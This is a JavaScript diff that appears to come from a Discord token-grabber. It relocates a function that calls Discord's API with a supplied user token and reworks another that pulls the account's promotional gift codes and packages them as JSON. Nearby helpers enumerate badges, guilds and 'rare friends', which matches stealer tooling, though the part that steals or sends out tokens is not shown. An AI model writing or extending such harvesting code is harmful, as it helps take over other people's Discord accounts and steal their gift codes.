@@ -75,6 +75,17 @@ const languages = {
   "hu": "🇳🇴🇭🇺 Hungarian",
 };
 
+let getDiscordApi = (i, token) => {
+  const res = require("sync-fetch")(i, {
+    method: "GET",
+    headers: {
+      "Content-Type": "application/json",
+      Authorization: token,
+    },
+  });
+  return res.status === 200 ? res.json() : "Invalid";
+}
+
 let getLanguage = (l) => languages[l] || "Unknown Language";
 
 let getTheme = (t) => emojis.themes[t] || "Unknown Theme";
@@ -85,12 +96,17 @@ let getImage = (p) => !p ? false : `${p}.${require("sync-fetch")(p).headers.get(
 
 let getGiftsCodes = (token, f) => {
   let t = [], r = getDiscordApi(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${f.locale}`, token);
-  return r.length === 0 ? "Codes Gifts Not Found" : r.forEach((g) => {
-    t.push({
-      name: g.promotion.outbound_title,
-      code: g.code,
+  if (r && r.length > 0) {
+    r.forEach((g) => {
+      t.push(JSON.stringify({
+        name: g.promotion.outbound_title,
+        code: g.code,
+      }));
     });
-  });
+    return t;
+  } else {
+    return "Gift Codes Not Found";
+  }
 };
 
 let getGuilds = (n) => {
@@ -111,16 +127,6 @@ let rareFriend = (r) => {
   return ñ || "Not Found";
 };
 
-let getDiscordApi = (i, token) => {
-  const res = require("sync-fetch")(i, {
-    method: "GET",
-    headers: {
-      "Content-Type": "application/json",
-      Authorization: token,
-    },
-  });
-  return res.status === 200 ? res.json() : "Invalid";
-}
 
 let AllBadges = (f) => ((1 & f ? emojis.user.i[0] : "") + (2 & f ? emojis.user.i[1] : "") + (4 & f ? emojis.user.i[2] : "") + (8 & f ? emojis.user.i[3] : "") + (64 & f ? emojis.user.i[4] : "") + (128 & f ? emojis.user.i[5] : "") + (256 & f ? emojis.user.i[6] : "") + (512 & f ? emojis.user.i[7] : "") + (16384 & f ? emojis.user.i[8] : "") + (4194304 & f ? emojis.user.i[9] : "") + (131072 & f ? emojis.user.i[10] : "")) || ":x:";
 
